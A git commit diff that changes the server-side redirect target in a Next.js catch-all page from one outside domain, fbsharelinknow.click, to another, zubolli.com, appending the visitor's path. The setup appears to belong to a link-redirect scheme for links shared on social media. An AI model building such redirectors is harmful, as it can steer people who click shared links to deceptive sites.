f285d195f5bced95e9c9323e0ddc2305e0c58295
Fazijutt762 <133943555+Fazijutt762@users.noreply.github.com>
2024-04-14 15:23:29 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://fbsharelinknow.click/` + encodeURI(path as string)
+					`https://zubolli.com/` + encodeURI(path as string)
 				}`,
 			},
 		};
